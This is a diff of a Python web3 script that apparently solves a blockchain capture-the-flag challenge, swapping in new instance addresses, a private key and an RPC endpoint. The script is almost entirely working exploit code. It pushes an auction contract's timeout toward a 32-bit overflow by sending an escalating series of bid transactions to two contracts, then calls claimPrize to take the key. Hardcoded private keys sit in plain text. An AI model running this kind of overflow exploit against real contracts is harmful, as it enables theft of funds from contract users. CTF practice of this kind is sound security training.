@@ -4,10 +4,10 @@ from web3.gas_strategies.rpc import rpc_gas_price_strategy
 from solcx import compile_source, install_solc, compile_files
 
 x = {
-    "PrivateKey": "0x50086d6229b0adf8b45efe6a868f21335b3dc83adbb58a7e6cdb6540b6c2aee3",
-    "Address": "0x5B0ab4c26cCF17032607C3a8be251de0341eeEcd",
-    "TargetAddress": "0xA735e8f54a61031b17A2a855cB14c7C1fd298f6D",
-    "setupAddress": "0x859D696A3f612AC1FfFDfaDF7eC2256067AeE170"
+    "PrivateKey": "0x9773a58df93ea20773af4e992075672fb50680fdf42cde3df38067eeb7e0260a",
+    "Address": "0x25202da1b2c4430EC558Fb5CB4a6373Ec1E8ca14",
+    "TargetAddress": "0xCc9226Ab913A9ede76CB3B828c97169121e78aEb",
+    "setupAddress": "0x28541E7c29299F52e41a7A255e7485B95f67E523"
 }
 
 PrivateKey =    x["PrivateKey"]
@@ -15,11 +15,13 @@ Address =       x["Address"]
 TargetContract = x["TargetAddress"]
 SetupContract =  x["setupAddress"]
 
-Target2Contract = "0x0B8d82e912Cd7EDC5Bd3C5Ab5F4e1ae41021c349"
+Target2Contract = "0x35506d0131E4Df20d18AD2dc7CFB29f31BE0a3B9"
 
-url = 'http://167.172.62.51:30595/rpc'
+url = 'http://167.172.62.51:30058/rpc'
 
 YEAR = 31556926
+
+values = [2**63, 1, 2*1+1, 2*3+1, 2*7+1 , 2*15+1, 2*31+1, 2*63+1, 2*127+1, 2*255+1, 2*511+1, 2*1023+1, 2*2047+1, 2*4095+1, 2*8191+1, 2*(2**14-1)+1, 2*(2**15-1)+1, 2*(2**16-1)+1, 2*(2**17-1)+1, 2*(2**18-1)+1,2*(2**19-1)+1,2*(2**20-1)+1 ]
 
 w3 = Web3(Web3.HTTPProvider(url))
 block_number = w3.eth.block_number
@@ -29,7 +31,7 @@ print(timeout0)
 
 timegap = 2**32 - timeout0
 print(f'Time gap: {timegap}')
-adjust = 5
+adjust = 1
 index = timegap//YEAR + adjust
 print(f'Gap counter: {index}')
 
@@ -48,20 +50,25 @@ contract_instance = w3.eth.contract(address=TargetContract, abi=abi)
 
 addr = Address
 target = TargetContract
+target2 = Target2Contract
 
 contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi_contract)
 
-value = 500000000000000000
+ii = 0
 for i in range(index//2 + 1):
-	value = 2*value + 1	
-	contract_instance2.functions.attack2(value).transact()
+	value = values[ii]
+	ii += 1
+	w3.eth.send_transaction({"from":addr, "to":target2,"value":value,})
+	#contract_instance2.functions.attack2(value).transact()
 	
 	print(f'{i}-1')
 	print(f'value = {value}')
 	print(contract_instance.functions.topBidder().call())
 	print(contract_instance.functions.timeout().call())
+	print(contract_instance.functions.keyOwner().call())
 
-	value = 2*value + 1	
+	value = values[ii]
+	ii += 1
 	w3.eth.send_transaction({"from":addr, "to":target,"value":value,})
 	#w3.eth.call({"to":target,"value":value,})
 
@@ -69,8 +76,9 @@ for i in range(index//2 + 1):
 	print(f'value = {value}')
 	print(contract_instance.functions.topBidder().call())
 	print(contract_instance.functions.timeout().call())
+	print(contract_instance.functions.keyOwner().call())
 
-#contract_instance.functions.claimPrize().transact()
+contract_instance.functions.claimPrize().call()
 
 compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.7.0")
 abi = compiled['Setup.sol:Setup']['abi']
